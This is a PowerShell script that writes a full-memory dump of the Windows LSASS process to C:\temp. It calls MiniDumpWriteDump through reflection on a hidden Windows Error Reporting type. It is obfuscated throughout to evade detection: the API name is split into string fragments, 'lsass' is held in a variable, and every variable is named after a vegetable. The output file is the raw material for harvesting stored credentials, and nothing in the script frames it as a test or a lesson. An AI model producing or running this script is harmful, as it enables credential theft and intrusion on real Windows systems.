# Define the output directory for logs
$carrot = "C:\temp"

# Ensure the directory exists
if (!(Test-Path -Path $carrot)) {
    New-Item -ItemType Directory -Path $carrot | Out-Null
}

# Get a process by name dynamically (instead of hardcoding LSASS directly)
$potato = "lsass"
$cabbage = Get-Process | Where-Object { $_.Name -eq $potato }

# If no process found, exit
if (-not $cabbage) {
    Write-Output "Target process '$potato' not found."
    exit
}

# Load Windows Error Reporting API
$tomato = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$lettuce = $tomato.GetNestedType('NativeMethods', 'NonPublic')
$onion = [Reflection.BindingFlags] 'NonPublic, Static'

# Breaking down 'MiniDumpWriteDump' into separate parts
$eggplant1 = "Mini"
$eggplant2 = "Dump"
$eggplant3 = "Write"
$eggplant4 = "Dump"

# Concatenate parts to form the full method name
$methodName = $eggplant1 + $eggplant2 + $eggplant3 + $eggplant4

# Get the method to write dump
$zucchini = $lettuce.GetMethod($methodName, $onion)

# Define the dump file path
$broccoli = "$($cabbage.Name)_$($cabbage.Id).dmp"
$radish = Join-Path -Path $carrot -ChildPath $broccoli

# Open file stream for the dump
$spinach = New-Object IO.FileStream($radish, [IO.FileMode]::Create)

# Define the dump type (2 = MiniDumpWithFullMemory)
$asparagus = [UInt32] 2

# Call the MiniDumpWriteDump function
$pumpkin = $zucchini.Invoke($null, @($cabbage.Handle, 0, $spinach.SafeFileHandle, $asparagus, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero))

# Close the file stream
$spinach.Close()

# Check for success
if ($pumpkin) {
    Write-Output "Dump successfully created: $radish"
} else {
    Write-Output "Failed to create dump."
}
